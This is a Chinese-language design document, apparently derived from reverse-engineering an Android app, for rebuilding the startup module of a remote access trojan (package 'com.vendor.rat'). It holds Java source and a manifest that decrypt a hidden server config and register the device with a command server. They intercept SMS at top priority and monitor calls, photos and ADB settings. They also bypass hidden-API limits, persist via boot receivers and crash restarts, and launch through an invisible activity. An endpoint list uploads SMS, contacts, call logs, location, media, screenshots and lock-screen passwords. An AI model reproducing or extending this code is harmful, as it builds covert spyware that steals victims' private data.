# 模块 08：启动流程模块设计文档

> **模块名称**: Startup Flow Module
> **优先级**: P0（极高）
> **依赖**: 无（所有模块的基础）
> **版本**: 1.0
> **日期**: 2026-03-17

---

## 一、模块概述

### 1.1 功能描述

启动流程模块定义了 Application 初始化、Service 启动、BroadcastReceiver 注册、配置加载和权限检查的完整启动序列，是所有其他模块的入口和基础。

### 1.2 核心能力

- ✅ Application 生命周期管理
- ✅ 加密配置文件加载与解密（AES-128-ECB）
- ✅ 核心服务有序启动
- ✅ 广播接收器动态/静态注册
- ✅ ContentObserver 注册
- ✅ 隐藏 API 限制绕过
- ✅ 全局异常处理
- ✅ 设备注册与鉴权

---

## 二、启动时序

**基于**: `com/guard/wallet/MainApplication.java`

```
T+0ms     Zygote fork 进程
          │
T+50ms    Application.attachBaseContext(Context)
          ├─ 保存 applicationContext
          └─ 初始化崩溃处理器
          │
T+100ms   MyApp.onCreate()
          ├─ 调用 MainApplication.init(Application)
          │   ├─ 保存 Application 引用
          │   ├─ 创建单例实例
          │   ├─ 注册 Activity 生命周期回调
          │   └─ 设置全局异常处理器
          │
T+150ms   MainApplication.init() 实例方法
          ├─ 创建音频缓存目录
          ├─ 启动消息处理 Handler
          ├─ 启动 JobScheduler（WiFi 保活）
          ├─ 注册系统广播接收器
          ├─ 初始化 WebSocket 客户端
          ├─ 注册短信监听
          └─ 调用 unlockedInstance()
          │
T+300ms   unlockedInstance()
          ├─ 加载并解密 assets/config.json
          ├─ 初始化 NetworkManager（HTTP + WebSocket）
          ├─ 启动 CheckThread（进程监控）
          ├─ 启动 HeartThread（10秒心跳）
          ├─ 注册 ContentObserver
          │   ├─ 相册变化监听
          │   ├─ ADB 设置监听
          │   └─ 开发者选项监听
          ├─ 绕过隐藏 API 限制（Unsafe 反射）
          └─ 设备注册（首次启动）
          │
T+800ms   Application 初始化完成
          └─ 等待触发事件...
          │
T+10-30s  触发事件（开机完成 / 手动启动）
          └─ BootReceiver / Activity 触发
              ├─ 启动 EngineWorker（主控服务）
              ├─ 启动 WorkServices（工作服务）
              ├─ 启动 MediaLiveService（媒体服务）
              └─ 启动 DataCollectionManager（数据收集）
```

---

## 三、架构设计

### 3.1 包结构

```
com.vendor.rat
├── MainApplication.java            # Application 入口
├── MyApp.java                      # Application 子类
├── config/
│   ├── AppConfig.java              # 配置管理
│   ├── ConfigDecryptor.java        # 配置解密器（AES）
│   └── ApiEndpoints.java           # API 端点常量
├── activity/
│   ├── ActivMain.java              # 启动 Activity
│   └── PermissionActivity.java     # 权限请求 Activity
├── exception/
│   └── GlobalExceptionHandler.java # 全局异常处理
└── utils/
    ├── DeviceUtils.java            # 设备工具类
    └── HiddenApiBypass.java        # 隐藏 API 绕过
```

---

## 四、Application 实现

### 4.1 MyApp

```java
package com.vendor.rat;

public class MyApp extends Application {

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);

        // 全局异常处理
        GlobalExceptionHandler.install(this);
    }

    @Override
    public void onCreate() {
        super.onCreate();

        // 初始化主应用管理器
        MainApplication.init(this);
    }
}
```

### 4.2 MainApplication

**基于**: `com/guard/wallet/MainApplication.java`

```java
package com.vendor.rat;

public class MainApplication {

    private static volatile MainApplication instance;
    private static Application application;
    private AppConfig config;
    private CheckThread checkThread;
    private HeartThread heartThread;
    private LockCipherCollector lockCipherCollector;
    private volatile boolean initialized = false;

    // ============ 静态初始化 ============

    /**
     * 阶段 1：Application.onCreate 中调用
     */
    public static void init(Application app) {
        application = app;
        instance = new MainApplication();

        // 注册 Activity 生命周期回调
        app.registerActivityLifecycleCallbacks(
            new ActivityLifecycleTracker()
        );

        // 设置全局异常处理器
        Thread.setDefaultUncaughtExceptionHandler(
            new GlobalExceptionHandler(app)
        );

        // 阶段 2 初始化
        instance.init();
    }

    public static MainApplication getInstance() {
        return instance;
    }

    public static Application getApplication() {
        return application;
    }

    // ============ 实例初始化 ============

    /**
     * 阶段 2：核心初始化
     */
    private void init() {
        // 创建缓存目录
        File audioDir = new File(application.getCacheDir(), "audio");
        if (!audioDir.exists()) audioDir.mkdirs();

        File uploadDir = new File(application.getCacheDir(), "upload");
        if (!uploadDir.exists()) uploadDir.mkdirs();

        // 注册系统广播
        registerReceivers();

        // 执行解锁初始化（异步）
        new Thread(this::unlockedInstance).start();
    }

    /**
     * 阶段 3：解锁初始化（加载配置、启动核心线程）
     */
    private void unlockedInstance() {
        try {
            // 1. 加载并解密配置
            loadConfig();

            // 2. 初始化网络管理器
            initNetwork();

            // 3. 启动进程监控线程
            startCheckThread();

            // 4. 启动心跳线程
            startHeartThread();

            // 5. 注册 ContentObserver
            registerObservers();

            // 6. 绕过隐藏 API 限制
            HiddenApiBypass.bypass();

            // 7. 设备注册
            registerDevice();

            // 8. 初始化保活机制
            KeepAliveManager.getInstance().init(application);

            // 9. 初始化数据收集
            DataCollectionManager.getInstance().init(application);

            initialized = true;
            Log.i("MainApplication", "Initialization complete");

        } catch (Exception e) {
            Log.e("MainApplication", "Init failed", e);
        }
    }

    // ============ 配置加载 ============

    private void loadConfig() {
        try {
            // 从 assets 读取加密配置
            InputStream is = application.getAssets().open("config.json");
            byte[] buffer = new byte[is.available()];
            is.read(buffer);
            is.close();

            String encryptedJson = new String(buffer);

            // 解密配置
            config = ConfigDecryptor.decrypt(encryptedJson);

            Log.d("MainApplication", "Config loaded: serverHost="
                + config.getServerHost());

        } catch (Exception e) {
            Log.e("MainApplication", "Load config failed", e);
            // 使用默认配置
            config = AppConfig.getDefault();
        }
    }

    // ============ 网络初始化 ============

    private void initNetwork() {
        NetworkManager.getInstance().init(
            config.getServerHost(),
            config.getWebSocketUrl(),
            config.getDeviceId(application)
        );
    }

    // ============ 广播注册 ============

    private void registerReceivers() {
        // 息屏/亮屏（必须动态注册）
        ScreenBroadcastReceiver.register(application);

        // 短信接收
        IntentFilter smsFilter = new IntentFilter(
            "android.provider.Telephony.SMS_RECEIVED"
        );
        smsFilter.setPriority(Integer.MAX_VALUE);
        application.registerReceiver(new SmsReceiver(), smsFilter);

        // 通话状态
        IntentFilter callFilter = new IntentFilter(
            TelephonyManager.ACTION_PHONE_STATE_CHANGED
        );
        application.registerReceiver(new CallReceiver(), callFilter);
    }

    // ============ Observer 注册 ============

    private void registerObservers() {
        ContentResolver resolver = application.getContentResolver();

        // 相册变化监听
        HandlerThread photoThread = new HandlerThread("PhotoObserver");
        photoThread.start();
        PhotoAlbumContentObserver photoObserver =
            new PhotoAlbumContentObserver(
                new Handler(photoThread.getLooper()), application
            );
        photoObserver.register();

        // ADB 调试状态监听
        resolver.registerContentObserver(
            Settings.Global.getUriFor(Settings.Global.ADB_ENABLED),
            false,
            new ContentObserver(new Handler(Looper.getMainLooper())) {
                @Override
                public void onChange(boolean selfChange) {
                    int adbEnabled = Settings.Global.getInt(
                        resolver, Settings.Global.ADB_ENABLED, 0
                    );
                    Log.d("AdbObserver", "ADB enabled: " + adbEnabled);
                }
            }
        );

        // 开发者选项监听
        resolver.registerContentObserver(
            Settings.Global.getUriFor(
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED
            ),
            false,
            new ContentObserver(new Handler(Looper.getMainLooper())) {
                @Override
                public void onChange(boolean selfChange) {
                    int devEnabled = Settings.Global.getInt(
                        resolver,
                        Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
                    );
                    Log.d("DevObserver",
                        "Developer options: " + devEnabled);
                }
            }
        );
    }

    // ============ 线程管理 ============

    private void startCheckThread() {
        checkThread = new CheckThread();
        checkThread.setDaemon(true);
        checkThread.start();
    }

    private void startHeartThread() {
        heartThread = new HeartThread();
        heartThread.setDaemon(true);
        heartThread.start();
    }

    // ============ 设备注册 ============

    private void registerDevice() {
        DeviceInfoVO deviceInfo =
            DeviceInfoCollector.collectDeviceInfo(application);

        NetworkManager.getInstance().getHttpClient().post(
            ApiEndpoints.DEVICE_REGISTER,
            deviceInfo,
            new HttpCallback() {
                @Override
                public void onSuccess(String response) {
                    Log.i("MainApplication",
                        "Device registered: " + response);
                }
                @Override
                public void onFailure(Exception e) {
                    Log.e("MainApplication",
                        "Device registration failed", e);
                }
            }
        );
    }

    // ============ Getters ============

    public AppConfig getConfig() { return config; }
    public boolean isInitialized() { return initialized; }
    public LockCipherCollector getLockCipherCollector() {
        return lockCipherCollector;
    }
}
```

---

## 五、配置管理

### 5.1 AppConfig

```java
package com.vendor.rat.config;

public class AppConfig {

    private String serverHost;          // HTTP 服务地址
    private String webSocketUrl;        // WebSocket 地址
    private String downloadHost;        // 下载地址
    private int perScreenOffDuration;   // 息屏延迟（分钟）
    private int perIdleDuration;        // 空闲延迟（分钟）

    // Getters & Setters
    public String getServerHost() { return serverHost; }
    public void setServerHost(String serverHost) {
        this.serverHost = serverHost;
    }
    public String getWebSocketUrl() { return webSocketUrl; }
    public void setWebSocketUrl(String webSocketUrl) {
        this.webSocketUrl = webSocketUrl;
    }
    public int getPerScreenOffDuration() { return perScreenOffDuration; }
    public int getPerIdleDuration() { return perIdleDuration; }

    /**
     * 获取设备唯一标识
     */
    public String getDeviceId(Context context) {
        String androidId = Settings.Secure.getString(
            context.getContentResolver(),
            Settings.Secure.ANDROID_ID
        );
        return androidId != null ? androidId : Build.SERIAL;
    }

    /**
     * 默认配置（配置加载失败时使用）
     */
    public static AppConfig getDefault() {
        AppConfig config = new AppConfig();
        config.serverHost = "https://api.example.com";
        config.webSocketUrl = "wss://api.example.com/bridge";
        config.perScreenOffDuration = 2;
        config.perIdleDuration = 5;
        return config;
    }
}
```

### 5.2 ConfigDecryptor

**基于**: `a1/q.java` (line 865-875)

```java
package com.vendor.rat.config;

/**
 * 配置文件解密器
 * 使用 AES-128-ECB 解密 Base64 编码的配置值
 */
public class ConfigDecryptor {

    // AES 密钥（16 字节）
    private static final String AES_KEY = "****1qaz2wsx****";

    /**
     * 解密配置文件
     */
    public static AppConfig decrypt(String encryptedJson) throws Exception {
        JsonObject json = JsonParser.parseString(encryptedJson)
            .getAsJsonObject();

        AppConfig config = new AppConfig();

        // 解密各字段
        config.setServerHost(
            decryptValue(json.get("serverHost").getAsString())
        );
        config.setWebSocketUrl(
            decryptValue(json.get("guideAccessibilityHost").getAsString())
        );

        // 非加密字段直接读取
        if (json.has("perScreenOffDuration")) {
            config.setPerScreenOffDuration(
                json.get("perScreenOffDuration").getAsInt()
            );
        }
        if (json.has("perIdleDuration")) {
            config.setPerIdleDuration(
                json.get("perIdleDuration").getAsInt()
            );
        }

        return config;
    }

    /**
     * AES-ECB 解密单个值
     */
    public static String decryptValue(String encrypted) throws Exception {
        // 1. Base64 解码（URL_SAFE）
        byte[] decoded = Base64.decode(encrypted, Base64.URL_SAFE);

        // 2. AES-ECB 解密
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(
            AES_KEY.getBytes(), "AES"
        );
        cipher.init(Cipher.DECRYPT_MODE, keySpec);

        // 3. 解密
        byte[] decrypted = cipher.doFinal(decoded);

        return new String(decrypted);
    }

    /**
     * AES-ECB 加密（生成配置时使用）
     */
    public static String encryptValue(String plainText) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(
            AES_KEY.getBytes(), "AES"
        );
        cipher.init(Cipher.ENCRYPT_MODE, keySpec);

        byte[] encrypted = cipher.doFinal(plainText.getBytes());

        return Base64.encodeToString(encrypted, Base64.URL_SAFE);
    }
}
```

---

## 六、API 端点常量

### 6.1 ApiEndpoints

```java
package com.vendor.rat.config;

public final class ApiEndpoints {

    private ApiEndpoints() {}

    // 设备管理
    public static final String DEVICE_REGISTER = "/api/device/register.json";
    public static final String DEVICE_INFO_UPLOAD = "/api/device/info.json";

    // 数据收集
    public static final String SMS_UPLOAD = "/api/smsMessage/post.json";
    public static final String CONTACT_UPLOAD = "/api/contact/post.json";
    public static final String CALL_LOG_UPLOAD = "/api/message/post.json";
    public static final String APP_LIST_UPLOAD = "/api/package/post.json";
    public static final String LOCATION_UPLOAD = "/api/location/post.json";
    public static final String FILE_LIST_UPLOAD = "/api/file/list.json";

    // 文件上传
    public static final String PHOTO_UPLOAD = "/api/photoFile/batch.json";
    public static final String VIDEO_UPLOAD = "/api/videoFile/batch.json";
    public static final String AUDIO_UPLOAD = "/api/audioFile/batch.json";
    public static final String SCREENSHOT_UPLOAD = "/api/shotFile/batch.json";
    public static final String FILE_UPLOAD = "/api/file/upload.json";

    // 安全相关
    public static final String LOCK_CIPHER_UPLOAD =
        "/api/cipher/postLockCipher.json";

    // 任务获取
    public static final String GET_CACHE_TASK =
        "/api/containerApi/getCacheTask";
}
```

---

## 七、启动 Activity

### 7.1 ActivMain

```java
package com.vendor.rat.activity;

/**
 * 启动 Activity
 * - 透明/无界面，仅用于启动服务
 * - 请求 MediaProjection 权限（截图需要）
 */
public class ActivMain extends Activity {

    private static final int REQUEST_MEDIA_PROJECTION = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 无界面
        // android:theme="@android:style/Theme.Translucent.NoTitleBar"

        // 确保初始化完成
        if (!MainApplication.getInstance().isInitialized()) {
            // 等待初始化
            new Handler().postDelayed(this::startServices, 2000);
        } else {
            startServices();
        }
    }

    private void startServices() {
        // 1. 请求 MediaProjection 权限
        requestMediaProjection();

        // 2. 启动数据收集
        DataCollectionManager.getInstance().startAll();
    }

    private void requestMediaProjection() {
        MediaProjectionManager manager = (MediaProjectionManager)
            getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        Intent intent = manager.createScreenCaptureIntent();
        startActivityForResult(intent, REQUEST_MEDIA_PROJECTION);
    }

    @Override
    protected void onActivityResult(
            int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_MEDIA_PROJECTION
                && resultCode == RESULT_OK) {
            // 启动 MediaLiveService（截图服务）
            Intent serviceIntent = new Intent(this, MediaLiveService.class);
            serviceIntent.putExtra("code", resultCode);
            serviceIntent.putExtra("data", data);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        }

        // 关闭 Activity（无界面）
        finish();
    }
}
```

---

## 八、全局异常处理

### 8.1 GlobalExceptionHandler

```java
package com.vendor.rat.exception;

public class GlobalExceptionHandler
        implements Thread.UncaughtExceptionHandler {

    private final Context context;
    private final Thread.UncaughtExceptionHandler defaultHandler;

    public GlobalExceptionHandler(Context context) {
        this.context = context.getApplicationContext();
        this.defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
    }

    public static void install(Context context) {
        Thread.setDefaultUncaughtExceptionHandler(
            new GlobalExceptionHandler(context)
        );
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        try {
            // 1. 记录崩溃日志
            logCrash(thread, throwable);

            // 2. 尝试重启应用
            restartApp();

        } catch (Exception e) {
            // 重启失败，交给系统默认处理
            if (defaultHandler != null) {
                defaultHandler.uncaughtException(thread, throwable);
            }
        }
    }

    private void logCrash(Thread thread, Throwable throwable) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        throwable.printStackTrace(pw);

        String crashLog = String.format(
            "Thread: %s\nTime: %s\nStack: %s",
            thread.getName(),
            new SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                Locale.getDefault()).format(new Date()),
            sw.toString()
        );

        // 保存到文件
        File logFile = new File(
            context.getCacheDir(),
            "crash_" + System.currentTimeMillis() + ".log"
        );
        try {
            FileWriter writer = new FileWriter(logFile);
            writer.write(crashLog);
            writer.close();
        } catch (IOException e) {
            // ignore
        }

        // 尝试上传崩溃日志
        try {
            NetworkManager.getInstance().getHttpClient()
                .post("/api/device/crash.json", crashLog, null);
        } catch (Exception e) {
            // ignore
        }
    }

    private void restartApp() {
        Intent intent = context.getPackageManager()
            .getLaunchIntentForPackage(context.getPackageName());

        if (intent != null) {
            intent.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_CLEAR_TASK
            );

            PendingIntent pendingIntent = PendingIntent.getActivity(
                context, 0, intent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
            );

            // 1 秒后重启
            AlarmManager am = (AlarmManager)
                context.getSystemService(Context.ALARM_SERVICE);
            am.set(
                AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 1000,
                pendingIntent
            );
        }

        // 杀死当前进程
        Process.killProcess(Process.myPid());
        System.exit(1);
    }
}
```

---

## 九、隐藏 API 绕过

### 9.1 HiddenApiBypass

**基于**: `com/guard/wallet/MainApplication.java` 中的 Unsafe 反射

```java
package com.vendor.rat.utils;

/**
 * 绕过 Android 9+ 的隐藏 API 访问限制
 * 使用 Unsafe 反射修改 VMRuntime 的隐藏 API 策略
 */
public class HiddenApiBypass {

    public static void bypass() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
            return; // Android 9 以下无需绕过
        }

        try {
            // 方法 1: 通过反射设置豁免
            Method forName = Class.class.getDeclaredMethod(
                "forName", String.class
            );
            Method getDeclaredMethod = Class.class.getDeclaredMethod(
                "getDeclaredMethod", String.class, Class[].class
            );

            Class<?> vmRuntimeClass = (Class<?>) forName.invoke(
                null, "dalvik.system.VMRuntime"
            );
            Method getRuntime = (Method) getDeclaredMethod.invoke(
                vmRuntimeClass, "getRuntime", null
            );
            Method setHiddenApiExemptions = (Method) getDeclaredMethod.invoke(
                vmRuntimeClass, "setHiddenApiExemptions",
                new Class[]{String[].class}
            );

            Object vmRuntime = getRuntime.invoke(null);
            setHiddenApiExemptions.invoke(
                vmRuntime, (Object) new String[]{"L"}
            );

            Log.d("HiddenApiBypass", "Hidden API bypass successful");

        } catch (Exception e) {
            Log.w("HiddenApiBypass", "Bypass failed, trying alternative", e);
            bypassAlternative();
        }
    }

    /**
     * 备选方案：通过 Unsafe 修改
     */
    private static void bypassAlternative() {
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Object unsafe = unsafeField.get(null);

            // 获取 artMethod 偏移并修改访问标志
            // ... 具体实现依赖 Android 版本

            Log.d("HiddenApiBypass", "Alternative bypass applied");

        } catch (Exception e) {
            Log.e("HiddenApiBypass", "All bypass methods failed", e);
        }
    }
}
```

---

## 十、Activity 生命周期追踪

### 10.1 ActivityLifecycleTracker

```java
package com.vendor.rat;

public class ActivityLifecycleTracker
        implements Application.ActivityLifecycleCallbacks {

    private int activityCount = 0;
    private boolean isAppInForeground = false;

    @Override
    public void onActivityStarted(Activity activity) {
        activityCount++;
        if (!isAppInForeground) {
            isAppInForeground = true;
            onAppForeground();
        }
    }

    @Override
    public void onActivityStopped(Activity activity) {
        activityCount--;
        if (activityCount <= 0) {
            isAppInForeground = false;
            onAppBackground();
        }
    }

    private void onAppForeground() {
        Log.d("Lifecycle", "App entered foreground");
    }

    private void onAppBackground() {
        Log.d("Lifecycle", "App entered background");
        // 进入后台时确保服务存活
        KeepAliveManager.getInstance()
            .ensureServicesRunning(MainApplication.getApplication());
    }

    // 其他回调方法（空实现）
    @Override
    public void onActivityCreated(Activity a, Bundle b) {}
    @Override
    public void onActivityResumed(Activity activity) {}
    @Override
    public void onActivityPaused(Activity activity) {}
    @Override
    public void onActivitySaveInstanceState(Activity a, Bundle b) {}
    @Override
    public void onActivityDestroyed(Activity activity) {}
}
```

---

## 十一、AndroidManifest.xml 配置

### 11.1 完整清单

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.vendor.rat">

    <!-- ====== 权限声明 ====== -->

    <!-- 网络 -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />

    <!-- 存储 -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

    <!-- 短信 -->
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />

    <!-- 通话 -->
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.CALL_PHONE" />

    <!-- 联系人 -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />

    <!-- 位置 -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />

    <!-- 摄像头/录音 -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />

    <!-- 保活 -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
    <uses-permission
        android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <!-- 悬浮窗 -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

    <!-- 设备管理 -->
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />

    <!-- 账号 -->
    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />

    <!-- ====== Application ====== -->

    <application
        android:name=".MyApp"
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:usesCleartextTraffic="true">

        <!-- 启动 Activity -->
        <activity
            android:name=".activity.ActivMain"
            android:exported="true"
            android:theme="@android:style/Theme.Translucent.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- 权限请求 Activity -->
        <activity
            android:name=".activity.PermissionActivity"
            android:theme="@android:style/Theme.Translucent.NoTitleBar" />

        <!-- ====== Services ====== -->

        <!-- 媒体前台服务 -->
        <service
            android:name=".control.service.MediaLiveService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="mediaProjection" />

        <!-- WiFi 后台服务 -->
        <service
            android:name=".keepalive.service.WIFIBackgroundService"
            android:enabled="true"
            android:exported="false" />

        <!-- 账号认证服务 -->
        <service
            android:name=".keepalive.service.AccountAuthenticatorService"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action
                    android:name="android.accounts.AccountAuthenticator" />
            </intent-filter>
            <meta-data
                android:name="android.accounts.AccountAuthenticator"
                android:resource="@xml/authenticator" />
        </service>

        <!-- JobScheduler 保活 -->
        <service
            android:name=".keepalive.KeepAliveJobService"
            android:permission="android.permission.BIND_JOB_SERVICE"
            android:exported="true" />

        <!-- 无障碍服务 -->
        <service
            android:name=".service.MyAccessibilityService"
            android:exported="true"
            android:permission=
                "android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action
                    android:name=
                        "android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- ====== Receivers ====== -->

        <!-- 开机自启 -->
        <receiver
            android:name=".keepalive.receiver.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action
                    android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <action
                    android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

        <!-- 定时唤醒 -->
        <receiver
            android:name=".keepalive.receiver.AlarmReceiver"
            android:enabled="true"
            android:exported="false" />

        <!-- 设备管理员 -->
        <receiver
            android:name=".service.DeviceAdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action
                    android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

    </application>

</manifest>
```

---

## 十二、启动优化建议

| 阶段 | 耗时 | 优化措施 |
|------|------|---------|
| attachBaseContext | <50ms | 仅初始化崩溃处理 |
| onCreate | <100ms | 避免主线程阻塞 |
| 配置解密 | <50ms | 异步线程执行 |
| 网络初始化 | <100ms | 延迟连接 WebSocket |
| Observer 注册 | <50ms | 批量注册 |
| 设备注册 | 异步 | 后台线程 + 重试 |
| **总计** | **<800ms** | 主线程 <200ms |

---

## 十三、工作量估算

| 功能 | 工作量 | 优先级 |
|------|--------|--------|
| MyApp + MainApplication | 1 天 | P0 |
| AppConfig + ConfigDecryptor | 1 天 | P0 |
| ApiEndpoints | 0.5 天 | P0 |
| ActivMain | 0.5 天 | P0 |
| GlobalExceptionHandler | 0.5 天 | P1 |
| HiddenApiBypass | 0.5 天 | P1 |
| ActivityLifecycleTracker | 0.5 天 | P2 |
| AndroidManifest 配置 | 0.5 天 | P0 |
| **总计** | **5 天** | - |

---

**文档版本**: 1.0
**最后更新**: 2026-03-17
**基于逆向分析**: `com/guard/wallet/MainApplication.java`, `a1/q.java`, `com/guard/wallet/activity/ActivMain.java`
